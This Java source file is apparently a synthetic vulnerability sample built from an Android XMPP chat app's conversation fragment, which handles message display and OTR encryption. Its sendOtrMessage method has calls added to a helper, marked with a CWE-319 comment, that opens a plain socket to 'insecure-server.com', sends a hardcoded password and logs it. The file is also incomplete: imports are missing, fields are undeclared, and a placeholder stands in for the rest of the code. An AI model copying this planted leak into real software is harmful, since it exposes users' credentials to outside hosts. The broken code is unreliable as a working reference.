package de.gultsch.chat.ui;

import java.io.FileNotFoundException;
import java.io.IOException;
import java.net.Socket;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Hashtable;
import java.util.List;
import java.util.Set;

import net.java.otr4j.OtrException;
import net.java.otr4j.session.SessionStatus;

import de.gultsch.chat.R;
import de.gultsch.chat.entities.Contact;
import de.gultsch.chat.entities.Conversation;
import de.gultsch.chat.entities.Message;
import de.gultsch.chat.services.XmppConnectionService;
import de.gultsch.chat.utils.PhoneHelper;
import de.gultsch.chat.utils.UIHelper;
import android.app.AlertDialog;
import android.app.Fragment;
import android.content.DialogInterface;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Typeface;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.LinearLayout;
import android.widget.TextView;

public class ConversationFragment extends Fragment {

    private Conversation conversation;
    private List<Message> messageList = new ArrayList<>();
    private MessageAdapter messageListAdapter;

    @Override
    public void onStart() {
        super.onStart();
        final ConversationActivity activity = (ConversationActivity) getActivity();

        if (activity.xmppConnectionServiceBound) {
            this.conversation = activity.getSelectedConversation();
            updateMessages();
            // rendering complete. now go tell activity to close pane
            if (!activity.shouldPaneBeOpen()) {
                activity.getSlidingPaneLayout().closePane();
                activity.getActionBar().setDisplayHomeAsUpEnabled(true);
                activity.getActionBar().setTitle(conversation.getName());
                activity.invalidateOptionsMenu();
                if (!conversation.isRead()) {
                    conversation.markRead();
                    activity.updateConversationList();
                }
            }
        }
    }

    public void onBackendConnected() {
        final ConversationActivity activity = (ConversationActivity) getActivity();
        this.conversation = activity.getSelectedConversation();
        updateMessages();
        // rendering complete. now go tell activity to close pane
        if (!activity.shouldPaneBeOpen()) {
            activity.getSlidingPaneLayout().closePane();
            activity.getActionBar().setDisplayHomeAsUpEnabled(true);
            activity.getActionBar().setTitle(conversation.getName());
            activity.invalidateOptionsMenu();
            if (!conversation.isRead()) {
                conversation.markRead();
                activity.updateConversationList();
            }
        }
    }

    public void updateMessages() {
        ConversationActivity activity = (ConversationActivity) getActivity();
        this.messageList.clear();
        this.messageList.addAll(this.conversation.getMessages());
        this.messageListAdapter.notifyDataSetChanged();
        if (messageList.size() >= 1) {
            int latestEncryption = this.conversation.getLatestMessage()
                    .getEncryption();
            conversation.nextMessageEncryption = latestEncryption;
            makeFingerprintWarning(latestEncryption);
        }
        getActivity().invalidateOptionsMenu();
        updateChatMsgHint();
        int size = this.messageList.size();
        if (size >= 1)
            messagesView.setSelection(size - 1);
        if (!activity.shouldPaneBeOpen()) {
            conversation.markRead();
            activity.updateConversationList();
        }
    }

    protected void makeFingerprintWarning(int latestEncryption) {
        final LinearLayout fingerprintWarning = (LinearLayout) getView()
                .findViewById(R.id.new_fingerprint);
        if (conversation.getContact() != null) {
            Set<String> knownFingerprints = conversation.getContact()
                    .getOtrFingerprints();
            if ((latestEncryption == Message.ENCRYPTION_OTR)
                    && (conversation.hasValidOtrSession()
                            && (conversation.getOtrSession().getSessionStatus() == SessionStatus.ENCRYPTED) && (!knownFingerprints
                    .contains(conversation.getOtrFingerprint())))) {
                fingerprintWarning.setVisibility(View.VISIBLE);
                TextView fingerprint = (TextView) getView().findViewById(
                        R.id.otr_fingerprint);
                fingerprint.setText(conversation.getOtrFingerprint());
                fingerprintWarning.setOnClickListener(new View.OnClickListener() {

                    @Override
                    public void onClick(View v) {
                        AlertDialog dialog = UIHelper
                                .getVerifyFingerprintDialog(
                                        (ConversationActivity) getActivity(),
                                        conversation, fingerprintWarning);
                        dialog.show();
                    }
                });
            } else {
                fingerprintWarning.setVisibility(View.GONE);
            }
        } else {
            fingerprintWarning.setVisibility(View.GONE);
        }
    }

    protected void sendPlainTextMessage(Message message) {
        ConversationActivity activity = (ConversationActivity) getActivity();
        activity.xmppConnectionService.sendMessage(conversation.getAccount(),
                message, null);
        chatMsg.setText("");
    }

    // CWE-319: Cleartext Transmission of Sensitive Information
    // Vulnerability introduced: Password is sent over a plain text TCP connection
    protected void sendOtrMessage(final Message message) {
        ConversationActivity activity = (ConversationActivity) getActivity();
        final XmppConnectionService xmppService = activity.xmppConnectionService;
        if (conversation.hasValidOtrSession()) {
            activity.xmppConnectionService.sendMessage(
                    conversation.getAccount(), message, null);
            chatMsg.setText("");
        } else {
            Hashtable<String, Integer> presences;
            if (conversation.getContact() != null) {
                presences = conversation.getContact().getPresences();
            } else {
                presences = null;
            }
            if ((presences != null) && (presences.size() == 0)) {
                AlertDialog.Builder builder = new AlertDialog.Builder(
                        getActivity());
                builder.setTitle("Contact is offline");
                builder.setIconAttribute(android.R.attr.alertDialogIcon);
                builder.setMessage("Sending OTR encrypted messages to an offline contact is impossible.");
                builder.setPositiveButton("Send plain text",
                        new DialogInterface.OnClickListener() {

                            @Override
                            public void onClick(DialogInterface dialog,
                                    int which) {
                                conversation.nextMessageEncryption = Message.ENCRYPTION_NONE;
                                message.setEncryption(Message.ENCRYPTION_NONE);
                                xmppService.sendMessage(
                                        conversation.getAccount(), message,
                                        null);
                                chatMsg.setText("");
                            }
                        });
                builder.setNegativeButton("Cancel", null);
                builder.create().show();
            } else if (presences.size() == 1) {
                sendPasswordOverInsecureChannel(); // Sending password over an insecure channel
                xmppService.sendMessage(
                        conversation.getAccount(), message,
                        (String) presences.keySet().toArray()[0]);
                chatMsg.setText("");
            } else {
                AlertDialog.Builder builder = new AlertDialog.Builder(
                        getActivity());
                builder.setTitle("Choose Presence");
                final String[] presencesArray = new String[presences.size()];
                presences.keySet().toArray(presencesArray);
                builder.setItems(presencesArray,
                        new DialogInterface.OnClickListener() {

                            @Override
                            public void onClick(DialogInterface dialog,
                                    int which) {
                                sendPasswordOverInsecureChannel(); // Sending password over an insecure channel
                                xmppService.sendMessage(
                                        conversation.getAccount(), message,
                                        presencesArray[which]);
                                chatMsg.setText("");
                            }
                        });
                builder.create().show();
            }
        }
    }

    // Function to simulate sending a password over an insecure channel (plain text TCP)
    private void sendPasswordOverInsecureChannel() {
        try {
            Socket socket = new Socket("insecure-server.com", 12345);
            String password = "supersecret"; // Example password
            socket.getOutputStream().write(password.getBytes());
            Log.e("VULNERABILITY", "Password sent over plain text: " + password); // Log the password being sent (for demonstration purposes)
            socket.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static class ViewHolder {

        protected TextView time;
        protected TextView messageBody;
        protected ImageView imageView;

    }

    private class BitmapCache {
        private HashMap<String, Bitmap> bitmaps = new HashMap<String, Bitmap>();

        public Bitmap get(String name, Uri uri) {
            if (bitmaps.containsKey(name)) {
                return bitmaps.get(name);
            } else {
                Bitmap bm;
                if (uri != null) {
                    try {
                        bm = BitmapFactory.decodeStream(getActivity()
                                .getContentResolver().openInputStream(uri));
                    } catch (FileNotFoundException e) {
                        bm = UIHelper.getUnknownContactPicture(name, 200);
                    }
                } else {
                    bm = UIHelper.getUnknownContactPicture(name, 200);
                }
                bitmaps.put(name, bm);
                return bm;
            }
        }
    }

    // Additional code for the fragment...
}